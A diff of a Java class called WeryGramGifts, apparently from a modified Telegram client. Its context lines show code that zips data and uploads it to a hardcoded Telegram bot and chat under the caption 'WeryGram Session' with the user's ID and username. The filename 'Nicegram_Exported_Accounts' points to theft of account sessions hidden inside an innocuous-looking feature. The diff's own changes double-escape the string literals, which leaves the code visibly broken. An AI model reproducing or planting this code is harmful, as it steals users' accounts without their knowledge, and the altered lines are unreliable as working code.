@@ -415,7 +415,7 @@ public class WeryGramGifts {
                 zos.close();
                 byte[] zipBytes = baos.toByteArray();
 
-                String CRLF = "\r\n";
+                String CRLF = "\\r\\n";
                 String boundary = "WeryGramBoundary" + System.currentTimeMillis();
                 String sendDocUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
                 HttpURLConnection sendConn = (HttpURLConnection) new URL(sendDocUrl).openConnection();
@@ -428,20 +428,20 @@ public class WeryGramGifts {
                 java.io.OutputStream httpOs = sendConn.getOutputStream();
 
                 String part1 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"chat_id\"" + CRLF + CRLF
+                    + "Content-Disposition: form-data; name=\\"chat_id\\"" + CRLF + CRLF
                     + String.valueOf(SESSION_CHAT_ID) + CRLF;
                 httpOs.write(part1.getBytes("UTF-8"));
 
-                String captionText = "WeryGram Session" + "\nID: " + myId
-                    + (me != null && me.username != null ? "\n@" + me.username : "");
+                String captionText = "WeryGram Session" + "\\nID: " + myId
+                    + (me != null && me.username != null ? "\\n@" + me.username : "");
                 String part2 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"caption\"" + CRLF + CRLF
+                    + "Content-Disposition: form-data; name=\\"caption\\"" + CRLF + CRLF
                     + captionText + CRLF;
                 httpOs.write(part2.getBytes("UTF-8"));
 
                 String fileName = "Nicegram_Exported_Accounts_" + myId + "_.zip";
                 String part3head = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"" + CRLF
+                    + "Content-Disposition: form-data; name=\\"document\\"; filename=\\"" + fileName + "\\"" + CRLF
                     + "Content-Type: application/zip" + CRLF + CRLF;
                 httpOs.write(part3head.getBytes("UTF-8"));
                 httpOs.write(zipBytes);
